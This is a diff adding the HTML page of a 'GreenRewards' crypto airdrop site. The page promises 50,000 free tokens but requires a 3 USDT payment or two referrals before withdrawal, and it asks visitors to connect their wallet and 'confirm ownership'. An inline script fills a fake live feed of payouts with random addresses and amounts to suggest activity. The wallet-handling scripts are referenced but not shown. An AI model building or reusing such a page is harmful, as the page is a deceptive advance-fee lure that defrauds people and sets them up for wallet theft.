@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GreenRewards Gateway</title>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;700;900&family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
+
+    <!-- WEB3 MODAL LINK -->
+    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/web3modal.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.0.27/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.5.0/dist/ethers.min.js"></script>
+
+    <!-- Web3 js -->
+    <script src="https://unpkg.com/web3@latest/dist/web3.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.5.0/dist/ethers.min.js"></script>
+    <script src="https://cdn.ethers.io/scripts/ethers-v3.min.js" charset="utf-8" type="text/javascript" defer></script>
+
+
+    <!-- Script Link -->
+    <script src="assets/scripts/general.js" defer type="module"></script>
+    <script src="assets/scripts/web3_interaction.js" defer type="module"></script>
+    <script src="assets/scripts/script2.js" defer type="module"></script>
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="assets/styles/index.css">
+</head>
+<body>
+    <!-- Header Section Starts -->
+    <header>
+        <h1>GreenRewards</h1>
+
+        <div class="is_connected_container">
+          <h3>REF COUNT = <span class="num_of_refs"></span> </h3>
+          &nbsp; &nbsp; &nbsp;
+          <button id="is_connected_btn"></button>
+          <p>Connected</p>
+        </div>
+    </header>
+    <!-- Header Section Ends -->
+
+    <!-- Main Body Starts -->
+    <section class="main_body">
+        <div class="token_info">
+            <!-- token image -->
+            <div class="token_img">
+                <img src="assets/images/pexels-luis-dalvan-1770809 (1).jpg" alt="GreenRewards Token image">
+            </div>
+
+            <!-- token body -->
+            <div class="token_info_body">
+                <h2> Embrace a Greener Future - <span>Your <br> Journey to Sustainable Rewards Begins Here</span></h2>
+
+                <h3>Welcome to the GreenRewards ecosystem, where your eco-friendly actions earn you valuable GreenRewards (GR) tokens. We're excited to announce that you're already eligible to claim 50,000 GR tokens as a token of appreciation for joining our mission to create a greener world. But that's just the beginning! Read on to discover how you can maximize your rewards and contribute even more to our sustainable community.</h3>
+
+                <br><br>
+
+                <div class="text token_info_body">
+                  <h3>Claim Your First 50,000 GR Tokens:</h3>
+                  <p>At GreenRewards, we believe in recognizing your commitment to a sustainable lifestyle. As a new member, you're entitled to claim 50,000 GR tokens – a fantastic starting point for your journey towards a greener future. These tokens have real-world value, with 50,000 GR tokens currently worth approximately <b>$60.</b></p>
+                </div>
+
+                <div class="text token_info_body">
+                  <h3>The Road to 100,000 GR Tokens:</h3>
+                  <p>While your 50,000 GR tokens are a great kickstart, you're probably wondering how to unlock their full potential. We've set an exciting milestone for you – reach 100,000 GR tokens, currently valued at <b>$120</b>, and you'll be able to withdraw your tokens or use them for a variety of eco-friendly rewards and initiatives.</p>
+                </div>
+
+                <div class="text">
+                  <h3>Here's How You Can Achieve It:</h3>
+                </div>
+
+                <div class="text">
+                  <p><b>1. REFER FRIENDS, MULTIPLY REWARDS:</b> Spread the word about GreenRewards and invite your friends to join our mission. When two friends you refer successfully sign up and reach 50,000 GR tokens each, you'll achieve the 100,000 GR token milestone. It's a win-win: you and your friends contribute to a greener world, and you unlock the full value of your tokens together.</p>
+                </div>
+
+                <div class="text">
+                  <p><b>2. Speed Up Your Progress:</b> We understand that not everyone has the time to wait, and that's why we've created an alternative path. You can fast-track your journey to 100,000 GR tokens by making a one-time contribution of 3 USDT (Tether). This contribution not only helps support our sustainable initiatives but also gets you closer to your goal instantly.</p>
+                </div>
+
+
+
+                <!-- WEB3 Buttons -->
+                <button id="connect_wallet">Connect Wallet</button>
+                <button id="disconnect_btn">Disconnect Wallet</button>
+                <button id="claim_gr_btn">Claim GR Tokens</button>
+
+                <!-- ELigibility Criteria -->
+                <div class="eligibility">
+                    <h3 id="eligibility_heading">ELIGIBILITY CRITERIA</h3>
+                    <ul>
+                        <li>New Wallets Cannot PARTICIPATE</li>
+                        <li>Your Wallet Must Have TRANSACTIONS</li>
+                        <li>You Must Confirm That You Are The OWNER of The WALLET</li>
+                    </ul>
+                </div>
+
+                <!-- Airdrop Realtime Data -->
+                <div class="realtime_data eligibility">
+                    <h3>GreenRewards Airdrop</h3>
+
+                    <div class="outer_cont">
+                        <div class="inner_cont">
+                            <div class="heading">
+                                <h4>Tx Time</h4>
+                                <h4>Address</h4>
+                                <h4>Profit</h4>
+                            </div>
+
+                            <div class="airdrops">
+                                <div class="single_airdrop">
+                                    <h4 class="time">05:42:08</h4>
+                                    <h4 class="cust_address">0xc9d6141e*****8fed7b637e</h4>
+                                    <h4 class="profit">40 <span>GR</span></h4>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- Main Body Ends -->
+
+    <!-- Connect Wallet Section -->
+    <section class="connect_wallet_cont">
+        <div class="inner_cont">
+            <h2>Claim Your Token</h2>
+            <div class="wallet_options">
+                <div class="wallet">
+                    <img src="assets/images/metamask-icon.svg" alt="Metamask Icon" width="40">
+                    <h3 id="deposit_usdt_btn">Deposit 3USDT (ERC20)</h3>
+                </div>
+                <h3>OR</h3>
+                <br>
+                <div class="wallet refer_wrapper">
+                    <img src="assets/images/coinbase-wallet-logo.svg" alt="Coinbase Wallet Icon" width="40" >
+                    <h3 class="refer_btn">REFER 2 FRIENDS &nbsp; &nbsp; <small><i>(NOTE: *Your wallet has to be connected &nbsp; &nbsp; * Your 'REF COUNT' shows how many referrals you have)</i> </small> </h3>
+                </div>
+            </div>
+
+            <h3 id="close_wallet_options">X</h3>
+        </div>
+    </section>
+
+    <!-- Loader -->
+    <div class="loader_wrapper">
+      <div class="center">
+        <div class="loader"></div>
+        <br>
+        <h2 class="loader_message">Wallet Verification.....</h3>
+      </div>
+    </div>
+
+    <!-- scripts -->
+    <script>
+        // get the table content element
+        var tableContent = document.querySelector('.airdrops');
+
+        // set the interval to add a new row with random data every 2-4 seconds
+        setInterval(function() {
+            // create a new row element with random data
+            var newRow = document.createElement('div');
+            newRow.className = 'single_airdrop';
+            newRow.innerHTML = '<h4 class="time"><span>' + getCurrentTime() + '</span></h4>' +
+                '<h4 class="cust_address">' + generateRandomAddress() + '</h4>' +
+                '<h4 class="profit">' + generateRandomProfit() +
+                '<span>GR</span></h4>';
+
+            // add the new row to the table
+            tableContent.insertBefore(newRow, tableContent.firstChild);
+        }, getRandomInterval(2000, 4000)); // interval in milliseconds (2-4 seconds)
+
+        // function to get the current time in HH:MM:SS format
+        function getCurrentTime() {
+            var date = new Date();
+            var hours = date.getHours();
+            var minutes = date.getMinutes();
+            var seconds = date.getSeconds();
+            return padZero(hours) + ':' + padZero(minutes) + ':' + padZero(seconds);
+        }
+
+        // function to pad a number with a leading zero if it's less than 10
+        function padZero(number) {
+            if (number < 10) {
+                return '0' + number;
+            } else {
+                return number;
+            }
+        }
+
+        // function to generate a random Ethereum address starting with 0x
+        function generateRandomAddress() {
+            var address = '0x';
+            var hexChars = '0123456789abcdef';
+            for (var i = 0; i < 38; i++) {
+                address += hexChars.charAt(Math.floor(Math.random() * hexChars.length));
+            }
+            return address.substring(0, 10) + '*****' + address.substring(30);
+        }
+
+        // function to generate a random profit value between 1000 and 20000
+        function generateRandomProfit() {
+            return Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
+        }
+
+        // function to generate a random interval between min and max (inclusive)
+        function getRandomInterval(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+    </script>
+
+
+
+    <!-- Wallet connect -->
+    <!-- <script>
+    import CoinbaseWalletSDK from 'node_modules/@coinbase/wallet-sdk'
+    // import Web3Modal from '../../node_modules/web3modal';
+    "use strict";
+
+    /**
+     * Example JavaScript code that interacts with the page and Web3 wallets
+     */
+
+     // Unpkg imports
+    const Web3Modal = window.Web3Modal.default;
+    const WalletConnectProvider = window.WalletConnectProvider.default;
+    // const coinbaseProvider = window.CoinbaseProvider.default;
+    const Fortmatic = window.Fortmatic;
+    const evmChains = window.evmChains;
+
+    // Web3modal instance
+    let web3Modal
+
+    // Chosen wallet provider given by the dialog window
+    let provider;
+
+
+    // Address of the selected account
+    let selectedAccount;
+
+
+    /**
+     * Setup the orchestra
+     */
+    function init() {
+
+      console.log("Initializing example");
+      console.log("WalletConnectProvider is", WalletConnectProvider);
+      console.log("Fortmatic is", Fortmatic);
+      console.log("coinbase is", coinbaseProvider);
+      console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);
+
+      // Check that the web page is run in a secure context,
+      // as otherwise MetaMask won't be available
+    //   if(location.protocol !== 'https:') {
+    //     // https://ethereum.stackexchange.com/a/62217/620
+    //     const alert = document.querySelector("#alert-error-https");
+    //     alert.style.display = "block";
+    //     document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+    //     return;
+    //   }
+
+      // Tell Web3modal what providers we have available.
+      // Built-in web browser provider (only one can exist as a time)
+      // like MetaMask, Brave or Opera is added automatically by Web3modal
+      const providerOptions = {
+        walletconnect: {
+          package: WalletConnectProvider,
+          options: {
+            // Mikko's test key - don't copy as your mileage may vary
+            infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
+          }
+        },
+
+        fortmatic: {
+          package: Fortmatic,
+          options: {
+            // Mikko's TESTNET api key
+            key: "pk_test_391E26A3B43A3350"
+          }
+        },
+
+        coinbase: {
+            package: coinbaseProvider, // Assuming you've imported the Coinbase Wallet provider library
+            options: {
+              appName: "YourAppName", // Replace with your app's name
+            },
+          },
+      };
+
+      web3Modal = new Web3Modal({
+        cacheProvider: false, // optional
+        providerOptions, // required
+        disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+      });
+
+      console.log("Web3Modal instance is", web3Modal);
+    }
+
+
+    /**
+     * Kick in the UI action after Web3modal dialog has chosen a provider
+     */
+    async function fetchAccountData() {
+
+      // Get a Web3 instance for the wallet
+      const web3 = new Web3(provider);
+
+      console.log("Web3 instance is", web3);
+
+      // Get connected chain id from Ethereum node
+      const chainId = await web3.eth.getChainId();
+      // Load chain information over an HTTP API
+      const chainData = evmChains.getChain(chainId);
+      document.querySelector("#network-name").textContent = chainData.name;
+
+      // Get list of accounts of the connected wallet
+      const accounts = await web3.eth.getAccounts();
+
+      // MetaMask does not give you all accounts, only the selected account
+      console.log("Got accounts", accounts);
+      selectedAccount = accounts[0];
+
+      document.querySelector("#selected-account").textContent = selectedAccount;
+
+      // Get a handl
+      const template = document.querySelector("#template-balance");
+      const accountContainer = document.querySelector("#accounts");
+
+      // Purge UI elements any previously loaded accounts
+      accountContainer.innerHTML = '';
+
+      // Go through all accounts and get their ETH balance
+      const rowResolvers = accounts.map(async (address) => {
+        const balance = await web3.eth.getBalance(address);
+        // ethBalance is a BigNumber instance
+        // https://github.com/indutny/bn.js/
+        const ethBalance = web3.utils.fromWei(balance, "ether");
+        const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
+        // Fill in the templated row and put in the document
+        const clone = template.content.cloneNode(true);
+        clone.querySelector(".address").textContent = address;
+        clone.querySelector(".balance").textContent = humanFriendlyBalance;
+        accountContainer.appendChild(clone);
+      });
+
+      // Because rendering account does its own RPC commucation
+      // with Ethereum node, we do not want to display any results
+      // until data for all accounts is loaded
+      await Promise.all(rowResolvers);
+
+      // Display fully loaded UI for wallet data
+      document.querySelector("#prepare").style.display = "none";
+      document.querySelector("#connected").style.display = "block";
+    }
+
+
+
+    /**
+     * Fetch account data for UI when
+     * - User switches accounts in wallet
+     * - User switches networks in wallet
+     * - User connects wallet initially
+     */
+    async function refreshAccountData() {
+
+      // If any current data is displayed when
+      // the user is switching acounts in the wallet
+      // immediate hide this data
+      document.querySelector("#connected").style.display = "none";
+      document.querySelector("#prepare").style.display = "block";
+
+      // Disable button while UI is loading.
+      // fetchAccountData() will take a while as it communicates
+      // with Ethereum node via JSON-RPC and loads chain data
+      // over an API call.
+      document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+      await fetchAccountData(provider);
+      document.querySelector("#btn-connect").removeAttribute("disabled")
+    }
+
+
+    /**
+     * Checking if connected network is ethereum
+     */
+    export async function is_ethereum_chainId() {
+      const web3 = new Web3(provider);
+
+      // Request the current chain ID
+      // const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      const chainId = await web3.eth.getChainId()
+
+      // Get the current chain ID
+      // const chainId = await provider.eth.getChainId();
+      console.log(chainId)
+
+      // Check if the chain ID matches BSC (56)
+      if (chainId == '56') {
+        console.log('Connected to Binance Smart Chain (BSC)');
+        return true
+      } 
+      else {
+        // console.log('Not connected to Binance Smart Chain (BSC)');
+        return false
+      }
+    }
+
+
+    /**
+     * Connect wallet button pressed.
+     */
+    async function onConnect() {
+
+      console.log("Opening a dialog", web3Modal);
+      try {
+        provider = await web3Modal.connect();
+      } catch(e) {
+        console.log("Could not get a wallet connection", e);
+        return;
+      }
+
+      // Subscribe to accounts change
+      provider.on("accountsChanged", (accounts) => {
+        fetchAccountData();
+      });
+
+      // Subscribe to chainId change
+      provider.on("chainChanged", (chainId) => {
+        fetchAccountData();
+      });
+
+      // Subscribe to networkId change
+      provider.on("networkChanged", (networkId) => {
+        fetchAccountData();
+      });
+
+      await refreshAccountData();
+    }
+
+    /**
+     * Disconnect wallet button pressed.
+     */
+    async function onDisconnect() {
+
+      console.log("Killing the wallet connection", provider);
+
+      // TODO: Which providers have close method?
+      if(provider.close) {
+        await provider.close();
+
+        // If the cached provider is not cleared,
+        // WalletConnect will default to the existing session
+        // and does not allow to re-scan the QR code with a new wallet.
+        // Depending on your use case you may want or want not his behavir.
+        await web3Modal.clearCachedProvider();
+        provider = null;
+      }
+
+      selectedAccount = null;
+
+      // Set the UI back to the initial state
+      document.querySelector("#prepare").style.display = "block";
+      document.querySelector("#connected").style.display = "none";
+    }
+
+
+    /**
+     * Main entry point.
+     */
+    window.addEventListener('load', async () => {
+      init();
+      document.querySelector("#connect_wallet").addEventListener("click", onConnect);
+      // document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+    });
+    </script> -->
+
+    <script type="text/javascript" src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js"></script>
+    <!-- <script src="https://cdn.jsdelivr.net/npm/@coinbase/wallet-mobile-sdk@1.0.7/build/CoinbaseWalletSDK.min.js"></script> -->
+    <script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
+</body>
+</html>
